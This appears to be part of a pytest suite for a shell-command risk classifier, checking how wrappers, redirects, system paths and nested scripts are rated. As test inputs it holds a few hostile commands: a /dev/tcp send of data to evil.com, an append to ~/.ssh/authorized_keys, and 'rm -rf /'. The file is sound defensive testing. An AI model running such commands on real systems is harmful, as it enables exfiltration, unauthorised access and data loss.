        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    @pytest.mark.parametrize(
        "expression",
        [
            "sudo sh -c '/bin/touch /etc/passwd'",
            "sh -c 'sudo /usr/bin/touch /etc/passwd'",
        ],
    )
    def test_a_floored_command_around_a_script_is_dangerous_either_way(
        self, expression: str, database: dict[str, CommandDef]
    ) -> None:
        """A documentation row, not a control.

        `sudo` is DANGEROUS/HIGH whatever it runs, inside or outside a script, so these pass in
        every version of this rule. They record that nesting a shell and a privilege wrapper in
        either order is handled; the rows above are what pin the behaviour.
        """
        result = classify_expression(expression, database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    @pytest.mark.parametrize(
        "script",
        [
            "mkdir -p /usr/lib/x",
            "touch /etc/newfile",
            "cp ./hosts /etc/hosts",
            "/usr/bin/git add a.txt",
            "git add a.txt",
            "cat /etc/hosts && touch x",
            "cd /usr/local/src && make",
            "git status",
        ],
    )
    def test_a_script_gets_the_verdict_its_commands_get_unwrapped(
        self, script: str, database: dict[str, CommandDef]
    ) -> None:
        """`sh -c 'X'` should agree with `X` in both directions, not only when it is safe to."""
        wrapped = classify_expression(f"sh -c '{script}'", database=database)
        bare = classify_expression(script, database=database)
        assert (wrapped.classification, wrapped.risk) == (bare.classification, bare.risk)

    def test_a_readonly_command_in_a_script_does_not_elevate_on_its_operand(
        self, database: dict[str, CommandDef]
    ) -> None:
        """Each command in a script is guarded by its own classification, not the shell's."""
        result = classify_expression("sh -c 'cat /etc/hosts && touch x'", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS
        assert result.risk == Risk.LOW

    def test_a_write_in_a_script_still_elevates_next_to_a_readonly_command(
        self, database: dict[str, CommandDef]
    ) -> None:
        result = classify_expression("sh -c 'cat /etc/hosts && touch /etc/x'", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_a_clustered_shell_flag_parses_no_script_at_all(self, database: dict[str, CommandDef]) -> None:
        """`-lc` is not the `-c` the database declares, so nothing is delegated and nothing scanned.

        The verdict below comes from `bash`'s own DANGEROUS classification, not from the script
        scan, so asserting only the verdict would pin a mechanism this test does not exercise.
        The absence of an inner command is the thing worth pinning; what it costs when the
        wrapper is not itself DANGEROUS is pinned by `TestUserDeclaredShellDelegation`.
        """
        result = classify_expression("bash -lc '/usr/bin/touch /etc/passwd'", database=database)
        assert result.commands[0].inner_commands == []
        assert result.commands[0].classification_reason == "base classification from rule bash"


class TestSystemPathOperandsStillCount:
    """The exemption covers the program word only; an operand naming a system path is still a hit."""

    def test_a_write_into_a_system_directory_is_dangerous(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cp a /usr/bin/b", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_the_destination_counts_even_when_the_program_is_absolute(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("/usr/bin/install -m755 x /usr/local/bin/y", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_the_program_word_is_exempt_once_not_everywhere(self, database: dict[str, CommandDef]) -> None:
        """`/usr/bin/git` is the program in position 0 and an operand in position 2."""
        result = classify_expression("/usr/bin/git add /usr/bin/git", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_a_nested_program_word_is_exempt_once_not_everywhere(self, database: dict[str, CommandDef]) -> None:
        """`env` rather than `sudo`, because `sudo` forces DANGEROUS on its own and would pass either way."""
        result = classify_expression("env /usr/bin/git add /usr/bin/git", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_a_program_word_from_inside_a_script_is_not_spent_on_an_outer_token(
        self, database: dict[str, CommandDef]
    ) -> None:
        """The script's `/bin/cp` must not exempt the `/bin/cp` operand of the enclosing `cp`."""
        result = classify_expression("cp /bin/cp dst/ && sh -c '/bin/cp a b'", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_operands_next_to_an_absolute_program_still_count(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("/bin/cp /bin/sh /usr/bin/x", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_operands_next_to_a_wrapped_absolute_program_still_count(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("env /bin/cp /bin/sh /usr/bin/x", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_a_redirect_into_a_system_directory_is_untouched(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo x > /etc/hosts", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_an_absolute_program_does_not_exempt_a_redirect(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("/bin/echo x > /etc/hosts", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    @pytest.mark.parametrize(
        "expression",
        ["find . -exec {} /usr/bin/git add ;", "find . -exec {} /bin/mkdir -p ;"],
    )
    def test_an_exec_argument_after_a_placeholder_is_not_the_program_word(
        self, expression: str, database: dict[str, CommandDef]
    ) -> None:
        """`{}` is stripped before the inner argv is built, so `argv[0]` here is an argument.

        The program is whatever file `find` matched; `/usr/bin/git` is handed to it. Exempting
        it would be this commit's own mistake aimed at the wrong token, and it would auto-approve
        an expression that executes every match.
        """
        result = classify_expression(expression, database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_an_exec_program_word_before_a_placeholder_is_still_exempt(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("find . -exec /bin/cp {} . ;", database=database)
        bare = classify_expression("find . -exec cp {} . ;", database=database)
        assert (result.classification, result.risk) == (bare.classification, bare.risk)
        assert result.classification == Classification.LOCAL_EFFECTS

    def test_an_exec_destination_counts_next_to_an_exempt_program_word(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("find . -exec /bin/cp {} /usr/bin/x ;", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_a_script_token_is_skipped_once_not_everywhere(self, database: dict[str, CommandDef]) -> None:
        """`/bin/ls` is the script here and also the argument handed to it; only the script is skipped."""
        result = classify_expression("nohup sh -c /bin/ls /bin/ls", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_a_script_token_found_deeper_does_not_skip_an_outer_token(self, database: dict[str, CommandDef]) -> None:
        """A nested script's token belongs to the inner command line, not to this one."""
        result = classify_expression("sh -c 'bash -c '/usr/bin/touch /etc/x''", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH


class TestUserDeclaredShellDelegation:
    """What clustering the delegating flag costs, where the wrapper is not DANGEROUS by itself."""

    @pytest.fixture
    def runner(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        """A user-defined command delegating on `-c`, with no DANGEROUS floor to hide behind."""
        commands = tmp_path / "config" / "commands"
        commands.mkdir(parents=True)
        (commands / "runner.yaml").write_text(
            "command: runner\n"
            "classification: LOCAL_EFFECTS\n"
            "risk: LOW\n"
            "strict: false\n"
            "delegates_to:\n"
            "  mode: flag_value_is_expression\n"
            "  flag: -c\n"
            "options:\n"
            "  -c: {takes_value: true}\n"
        )
        monkeypatch.setenv("BASH_CLASSIFY_CONFIG_DIR", str(tmp_path / "config"))

    @pytest.mark.usefixtures("runner")
    def test_the_declared_flag_delegates_and_the_script_is_scanned(self) -> None:
        result = classify_expression("runner -c 'mkdir -p /usr/lib/x'")
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    @pytest.mark.usefixtures("runner")
    def test_a_clustered_flag_delegates_nothing_and_the_script_is_missed(self) -> None:
        """Pins the limitation rather than the wish: clustering hides the script entirely.

        `sh`, `bash` and `zsh` are DANGEROUS from their own definitions, so this is invisible
        for them. Here it is not, and the miss is real. SPEC.md says so.
        """
        result = classify_expression("runner -lc 'mkdir -p /usr/lib/x'")
        assert result.classification == Classification.LOCAL_EFFECTS
        assert result.risk == Risk.LOW


class TestArgsAreExpressionScriptToken:
    """Only the token that holds the whole script is exempt, not every argument that has a space in it."""

    @pytest.fixture
    def runsh(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        """A user-defined command with `args_are_expression` and no DANGEROUS floor.

        `eval` is the only bundled command with that mode and it is floored to DANGEROUS, so
        it can never show what the exemption does. A user database can declare the mode
        without a floor, which README documents, and then the exemption is load-bearing.
        """
        commands = tmp_path / "config" / "commands"
        commands.mkdir(parents=True)
        (commands / "runsh.yaml").write_text(
            "command: runsh\nclassification: READONLY\nstrict: false\ndelegates_to:\n  mode: args_are_expression\n"
        )
        monkeypatch.setenv("BASH_CLASSIFY_CONFIG_DIR", str(tmp_path / "config"))

    @pytest.mark.usefixtures("runsh")
    def test_a_spaced_operand_is_not_mistaken_for_the_script(self) -> None:
        """The script is spread over three tokens here, so none of them is exempt."""
        result = classify_expression("runsh cp a '/usr/bin/my file'")
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    @pytest.mark.usefixtures("runsh")
    def test_the_single_script_token_is_exempt_and_its_commands_are_scanned(self) -> None:
        result = classify_expression("runsh '/usr/bin/git add a.txt'")
        assert result.classification == Classification.LOCAL_EFFECTS
        assert result.risk == Risk.LOW

    @pytest.mark.usefixtures("runsh")
    def test_an_operand_inside_the_single_script_token_still_counts(self) -> None:
        result = classify_expression("runsh '/usr/bin/cp a /usr/bin/b'")
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH


class TestRiskRedirectElevation:
    def test_output_redirect_medium_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > output.txt", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS
        assert result.risk == Risk.MEDIUM

    def test_devnull_redirect_stays_low_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > /dev/null", database=database)
        assert result.classification == Classification.READONLY
        assert result.risk == Risk.LOW

    @pytest.mark.parametrize("operator", _WRITE_REDIRECTS)
    def test_every_write_form_is_at_least_medium_risk(self, operator: str, database: dict[str, CommandDef]) -> None:
        result = classify_expression(f"echo hello {operator} output.txt", database=database)
        assert result.risk == Risk.MEDIUM

    @pytest.mark.parametrize("operator", _WRITE_REDIRECTS)
    def test_no_write_form_raises_risk_when_it_discards(self, operator: str, database: dict[str, CommandDef]) -> None:
        result = classify_expression(f"echo hello {operator} /dev/null", database=database)
        assert result.risk == Risk.LOW


class TestRiskDevTcpUdp:
    def test_dev_tcp_high_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat /dev/tcp/evil.com/80", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_dev_udp_high_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat /dev/udp/evil.com/53", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_redirect_to_dev_tcp_high_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo data > /dev/tcp/evil.com/80", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH


class TestRiskBackgrounding:
    def test_backgrounding_at_least_medium_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello &", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS
        assert result.risk == Risk.MEDIUM


class TestRiskExpressionAggregation:
    def test_expression_risk_is_max_across_commands(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("ls | rm file", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_expression_all_readonly_low_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("ls | grep pattern", database=database)
        assert result.classification == Classification.READONLY
        assert result.risk == Risk.LOW

    def test_empty_expression_low_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("", database=database)
        assert result.classification == Classification.READONLY
        assert result.risk == Risk.LOW

    def test_variable_in_command_position_high_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("$CMD arg1 arg2", database=database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH

    def test_malformed_bash_high_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("if then fi", database=database)
        assert result.classification == Classification.UNKNOWN
        assert result.risk == Risk.HIGH


class TestFilePathDetection:
    """Tests for write_paths/read_paths detection and temp path risk lowering."""

    def test_write_to_tmp_stays_low_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat > /tmp/foo.txt", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS
        assert result.risk == Risk.LOW
        assert result.write_paths == ["/tmp/foo.txt"]
        cmd = result.commands[0]
        assert cmd.write_paths == ["/tmp/foo.txt"]

    def test_write_to_var_tmp_stays_low_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat > /var/tmp/foo.txt", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS
        assert result.risk == Risk.LOW
        assert result.write_paths == ["/var/tmp/foo.txt"]

    def test_write_to_home_elevates_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat > /home/user/foo.txt", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS
        assert result.risk == Risk.MEDIUM
        assert result.write_paths == ["/home/user/foo.txt"]

    def test_mixed_tmp_and_home_elevates_risk(self, database: dict[str, CommandDef]) -> None:
        # Two redirects: one temp, one not -- should elevate
        result = classify_expression("echo hello > /tmp/a.txt > /home/user/b.txt", database=database)
        assert result.risk == Risk.MEDIUM

    def test_read_redirect_detected(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat < /home/user/data.txt", database=database)
        assert result.classification == Classification.READONLY
        assert result.risk == Risk.LOW
        assert result.read_paths == ["/home/user/data.txt"]
        assert result.write_paths == []

    def test_read_and_write_redirect(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("sort < /home/user/hosts > /tmp/sorted.txt", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS
        assert result.risk == Risk.LOW
        assert result.write_paths == ["/tmp/sorted.txt"]
        assert result.read_paths == ["/home/user/hosts"]

    def test_dev_null_excluded_from_write_paths(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat > /dev/null", database=database)
        assert result.write_paths == []

    def test_heredoc_not_in_read_paths(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat << EOF\nhello\nEOF", database=database)
        assert result.read_paths == []

    def test_expression_level_aggregation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat < /home/user/data.txt | tee /tmp/out.txt > /tmp/log.txt", database=database)
        assert "/home/user/data.txt" in result.read_paths
        assert "/tmp/log.txt" in result.write_paths

    @pytest.mark.parametrize("operator", _WRITE_REDIRECTS)
    def test_every_write_form_reports_its_target(self, operator: str, database: dict[str, CommandDef]) -> None:
        result = classify_expression(f"echo hello {operator} out.txt", database=database)
        assert result.write_paths == ["out.txt"]
        assert result.commands[0].write_paths == ["out.txt"]

    @pytest.mark.parametrize("operator", _READ_REDIRECTS)
    def test_every_read_form_reports_its_target(self, operator: str, database: dict[str, CommandDef]) -> None:
        result = classify_expression(f"cat {operator} in.txt", database=database)
        assert result.read_paths == ["in.txt"]
        assert result.write_paths == []

    @pytest.mark.parametrize("operator", _WRITE_REDIRECTS)
    def test_a_temp_target_stays_low_risk_in_every_write_form(
        self, operator: str, database: dict[str, CommandDef]
    ) -> None:
        """`1> /tmp/f` is the same operation as `> /tmp/f`, so it gets the same verdict."""
        result = classify_expression(f"echo hello {operator} /tmp/f", database=database)
        assert result.classification == Classification.LOCAL_EFFECTS
        assert result.risk == Risk.LOW
        assert result.write_paths == ["/tmp/f"]

    @pytest.mark.parametrize("operator", _WRITE_REDIRECTS)
    def test_a_discarded_target_is_no_write_path_in_any_form(
        self, operator: str, database: dict[str, CommandDef]
    ) -> None:
        result = classify_expression(f"echo hello {operator} /dev/null", database=database)
        assert result.write_paths == []

    def test_a_single_non_temp_target_elevates_risk(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > /tmp/a 2>> b", database=database)
        assert result.write_paths == ["/tmp/a", "b"]
        assert result.risk == Risk.MEDIUM

    def test_several_redirects_on_one_command_are_all_reported(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo hello > a 2> b", database=database)
        assert result.write_paths == ["a", "b"]

    def test_redirects_written_after_a_heredoc_opener_are_reported(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat <<EOF > a 2> b\nbody\nEOF", database=database)
        assert result.write_paths == ["a", "b"]
        assert result.read_paths == []

    def test_a_herestring_is_no_read_path(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat <<< hello", database=database)
        assert result.read_paths == []


class TestAliasOfClassification:
    """Tests for the alias_of feature — an alias file points at another command def."""

    def _make_db(self, tmp_path):
        from bash_classify.database import load_database

        (tmp_path / "target.yaml").write_text(
            "command: target\n"
            "classification: READONLY\n"
            "strict: false\n"
            "subcommands:\n"
            "  sub1: {classification: READONLY}\n"
            "  sub2: {classification: DANGEROUS}\n"
        )
        (tmp_path / "myalias.yaml").write_text("command: myalias\ndescription: pointer\nalias_of: target\n")
        return load_database(tmp_path)

    def test_alias_resolves_to_target(self, tmp_path) -> None:
        db = self._make_db(tmp_path)
        result = classify_expression("myalias sub1", database=db)
        target_result = classify_expression("target sub1", database=db)
        assert result.classification == target_result.classification
        assert result.risk == target_result.risk
        cmd = result.commands[0]
        # matched_rule and command reflect the alias as typed
        assert cmd.command[0] == "myalias"
        assert cmd.matched_rule == "myalias.sub1"

    def test_alias_resolves_dangerous_subcommand(self, tmp_path) -> None:
        db = self._make_db(tmp_path)
        result = classify_expression("myalias sub2", database=db)
        assert result.classification == Classification.DANGEROUS
        assert result.commands[0].matched_rule == "myalias.sub2"

    def test_dangling_alias_raises(self, tmp_path) -> None:
        import pytest

        (tmp_path / "myalias.yaml").write_text("command: myalias\nalias_of: nonexistent\n")
        from bash_classify.database import load_database

        db = load_database(tmp_path)
        with pytest.raises(ValueError, match="nonexistent"):
            classify_expression("myalias foo", database=db)

    def test_alias_chain_too_deep_raises(self, tmp_path) -> None:
        import pytest

        (tmp_path / "target.yaml").write_text("command: target\nclassification: READONLY\n")
        (tmp_path / "mid.yaml").write_text("command: mid\nalias_of: target\n")
        (tmp_path / "myalias.yaml").write_text("command: myalias\nalias_of: mid\n")
        from bash_classify.database import load_database

        db = load_database(tmp_path)
        with pytest.raises(ValueError, match="alias chain too deep"):
            classify_expression("myalias foo", database=db)


class TestIterInvocations:
    """`iter_invocations` walks every invocation depth-first with its wrapper chain."""

    def test_nested_wrappers(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("sudo timeout 5 env FOO=1 ls", database)
        entries = list(iter_invocations(result))
        assert [inv.command for inv, _ in entries] == [["sudo"], ["timeout"], ["env"], ["ls"]]
        assert [via for _, via in entries] == [
            [],
            ["sudo"],
            ["sudo", "timeout"],
            ["sudo", "timeout", "env"],
        ]

    def test_top_level_commands_have_empty_via(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("ls -la && grep -r foo .", database)
        entries = list(iter_invocations(result))
        assert [inv.command for inv, _ in entries] == [["ls"], ["grep"]]
        assert all(via == [] for _, via in entries)

    def test_command_substitution_is_top_level(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("echo $(ls /tmp)", database)
        entries = list(iter_invocations(result))
        assert ["ls"] in [inv.command for inv, _ in entries]
        assert all(via == [] for _, via in entries)

    def test_via_uses_resolved_command_path_joined_by_spaces(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("bash -c 'ls /tmp'", database)
        entries = list(iter_invocations(result))
        assert (["ls"], ["bash"]) in [(inv.command, via) for inv, via in entries]

    def test_options_are_visible_on_every_invocation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("sudo ls -la /tmp", database)
        by_command = {tuple(inv.command): inv for inv, _ in iter_invocations(result)}
        assert by_command[("ls",)].options == ["-la"]
        assert by_command[("ls",)].positionals == ["/tmp"]


class TestEvalExecInnerCommandsAreReachable:
    """The inner command of eval/exec shows up in iter_invocations, with the right via."""

    def test_eval_inner_is_reachable(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression('eval "git push --force"', database)
        entries = [(inv.command, via) for inv, via in iter_invocations(result)]
        assert (["eval"], []) in entries
        assert (["git", "push"], ["eval"]) in entries

    def test_exec_inner_is_reachable(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("exec ls -la", database)
        entries = [(inv.command, via) for inv, via in iter_invocations(result)]
        assert (["ls"], ["exec"]) in entries

    def test_eval_stays_dangerous_at_expression_level(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression('eval "ls -la"', database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH


class TestHeredocFollowerClassification:
    """A command piped from a heredoc opener must reach classification."""

    def test_pipe_to_a_dangerous_command(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat <<EOF | rm -rf x\nbody\nEOF", database)
        assert result.classification == Classification.DANGEROUS
        assert result.risk == Risk.HIGH
        assert [c.command for c in result.commands] == [["cat"], ["rm"]]
        assert result.parse_warnings == []

    def test_and_chain_to_a_dangerous_command(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression("cat > f <<EOF && rm -rf x\nbody\nEOF", database)
        assert result.classification == Classification.DANGEROUS
        assert [c.command for c in result.commands] == [["cat"], ["rm"]]

    def test_heredoc_body_still_does_not_classify(self, database: dict[str, CommandDef]) -> None:
        """The body names a dangerous command; only the piped `wc` is real, so this is READONLY."""
        result = classify_expression("cat <<EOF | wc -l\nrm -rf /\nEOF", database)
        assert result.classification == Classification.READONLY
        assert result.risk == Risk.LOW
        assert [c.command for c in result.commands] == [["cat"], ["wc"]]


class TestNestedExpressionParseWarnings:
    """A syntax error inside `bash -c` or `eval` must reach the top-level result.

    Otherwise `parse_warnings == []` would promise a trustworthy command list while the
    nested expression had silently produced nothing.
    """

    BROKEN = "for x in; ls"

    def test_shell_dash_c(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression(f"bash -c '{self.BROKEN}'", database)
        assert result.parse_warnings
        assert self.BROKEN in result.parse_warnings[0]

    def test_eval(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression(f'eval "{self.BROKEN}"', database)
        assert result.parse_warnings
        assert self.BROKEN in result.parse_warnings[0]

    def test_nested_two_deep(self, database: dict[str, CommandDef]) -> None:
        """The wrapper delegates to the shell, which parses the broken expression."""
        result = classify_expression(f"sudo bash -c '{self.BROKEN}'", database)
        assert result.parse_warnings
        assert self.BROKEN in result.parse_warnings[0]

    def test_nested_three_deep(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression(f"timeout 5 env FOO=1 bash -c '{self.BROKEN}'", database)
        assert result.parse_warnings

    def test_reached_through_option_delegation(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression(f"find . -exec bash -c '{self.BROKEN}' \\;", database)
        assert result.parse_warnings

    def test_identical_warnings_are_reported_once(self, database: dict[str, CommandDef]) -> None:
        result = classify_expression(f"bash -c '{self.BROKEN}' && bash -c '{self.BROKEN}'", database)
        assert len(result.parse_warnings) == 1

    def test_a_clean_nested_expression_warns_about_nothing(self, database: dict[str, CommandDef]) -> None:
        assert classify_expression("bash -c 'ls /tmp'", database).parse_warnings == []
        assert classify_expression('eval "ls -la"', database).parse_warnings == []
        assert classify_expression("sudo bash -c 'ls /tmp && rm -rf /var/tmp/x'", database).parse_warnings == []

    def test_a_broken_outer_expression_still_warns(self, database: dict[str, CommandDef]) -> None:
        """The outer parse and the nested one both feed the same list."""
        result = classify_expression(f"bash -c '{self.BROKEN}'; if then fi (", database)
        assert len(result.parse_warnings) == 2


class TestRedirectAttributionWritePaths:
    """Attribution decides which command reports a write path, and how many entries appear.

    `write_paths` is not a set: `cat a > f && cat b >> f` really does write `f` twice, and
    both entries belong there. What must never happen is one redirect producing two entries
    because it was attached to two commands, or producing none because it was attached to a
    command the walker dropped. So each expression pins the whole picture.
    """

    # (expression, expression-level write_paths, write_paths of each command in order)
    ATTRIBUTION_EXPRESSIONS = (
        ("cat a > f && cat b >> f", ["f", "f"], [["f"], ["f"]]),
        ("cat a > f 2> e && cat b >> f", ["f", "e", "f"], [["f", "e"], ["f"]]),
        ("a && b && cat c > f", ["f"], [None, None, ["f"]]),
        ("{ cat a; cat b; } > merged", ["merged"], [None, ["merged"]]),
        ("( cat x; cat y ) > f", ["f"], [None, ["f"]]),
        ("a && { b; c; } > f", ["f"], [None, None, ["f"]]),
        ("{ a | b; } > f", ["f"], [None, ["f"]]),
    )

    @pytest.mark.parametrize(("expression", "expected", "per_command"), ATTRIBUTION_EXPRESSIONS)
    def test_expression_write_paths(
        self,
        expression: str,
        expected: list[str],
        per_command: list[list[str] | None],
        database: dict[str, CommandDef],
    ) -> None:
        assert classify_expression(expression, database).write_paths == expected

    @pytest.mark.parametrize(("expression", "expected", "per_command"), ATTRIBUTION_EXPRESSIONS)
    def test_which_command_reports_each_write_path(
        self,
        expression: str,
        expected: list[str],
        per_command: list[list[str] | None],
        database: dict[str, CommandDef],
    ) -> None:
        result = classify_expression(expression, database)
        assert [c.write_paths for c in result.commands] == per_command

    def test_a_chain_writing_to_a_credential_path_stays_high(self, database: dict[str, CommandDef]) -> None:
        """The redirect moves to the second command; the credential must still be caught."""
        result = classify_expression("cat x && echo k >> ~/.ssh/authorized_keys", database)
        assert result.risk == Risk.HIGH
        assert result.write_paths == ["~/.ssh/authorized_keys"]
        echo = result.commands[1]
        assert echo.write_paths == ["~/.ssh/authorized_keys"]
        assert [hit.token for hit in echo.sensitive_paths] == ["~/.ssh/authorized_keys"]


class TestEndOfOptionsMarkerBeforeInnerCommand:
    """`rest_are_argv` must not read the wrapper's own `--` as the inner command.

    Every wrapper in this mode accepts an end-of-options marker before the command it runs.
    Reading `--` as the program word resolved the inner to UNKNOWN, which looks safe (it is
    HIGH) but is a misparse: it hides the real command from `sensitive_paths`, from `match`
    rules and from any consumer that walks `iter_invocations`.
    """

    MARKER_EXPRESSIONS = (
        ("sudo -- rm -rf /", ["rm"]),
        ("xargs -- ls", ["ls"]),
        ("env -- ls", ["ls"]),
        ("env -- FOO=bar ls", ["ls"]),
        ("timeout -- 5 ls", ["ls"]),
        ("npx -- rm -rf /", ["rm"]),
        ("pnpm exec -- eslint", ["eslint"]),
    )

    @pytest.mark.parametrize(("expression", "inner"), MARKER_EXPRESSIONS)
    def test_inner_command_resolves_past_the_marker(
        self, expression: str, inner: list[str], database: dict[str, CommandDef]
    ) -> None:
        result = classify_expression(expression, database=database)
        assert [invocation.command for invocation, via in iter_invocations(result) if via] == [inner]


class TestEndOfOptionsMarkerIsNotAlwaysAMarker:
    """`--` is the wrapper's marker only while the wrapper is still reading options.

    These pass on master too -- master read every one of these as `--` because it read *every*
    `--` that way. They are here as the guard on the other side of the skip, pinning the shapes
    the skip must not reach, not as coverage of anything the skip added.

    `env` stops parsing options at the first operand -- an assignment -- and `timeout` stops at
    the duration. Past that point the `--` is the program word, and a real shell agrees: each of
    these exits 127 with "No such file or directory". So the reading is UNKNOWN, and that is a
    correct reading rather than a missing feature.
    """

    NOT_A_MARKER = (
        ("env FOO=bar -- ls", ["--"]),
        ("timeout 5 -- ls", ["--"]),
        # POSIX makes the second `--` the program name, so only one is ever skipped
        ("sudo -- -- rm -rf /", ["--"]),
    )

    @pytest.mark.parametrize(("expression", "inner"), NOT_A_MARKER)
    def test_marker_past_an_operand_is_the_program_word(
        self, expression: str, inner: list[str], database: dict[str, CommandDef]
    ) -> None:
        result = classify_expression(expression, database=database)
        assert [invocation.command for invocation, via in iter_invocations(result) if via] == [inner]

    @pytest.mark.parametrize(("expression", "risk"), [("env FOO=bar -- ls", Risk.HIGH), ("timeout 5 -- ls", Risk.HIGH)])
    def test_unresolvable_program_word_is_not_low(
        self, expression: str, risk: Risk, database: dict[str, CommandDef]
    ) -> None:
        assert classify_expression(expression, database=database).risk == risk

    def test_marker_before_the_wrappers_own_operand_still_skips_it(self, database: dict[str, CommandDef]) -> None:
        """`timeout -- 5 ls` is accepted by a real timeout: skip the marker, then the duration."""
        result = classify_expression("timeout -- 5 ls", database=database)
        assert [invocation.command for invocation, via in iter_invocations(result) if via] == [["ls"]]
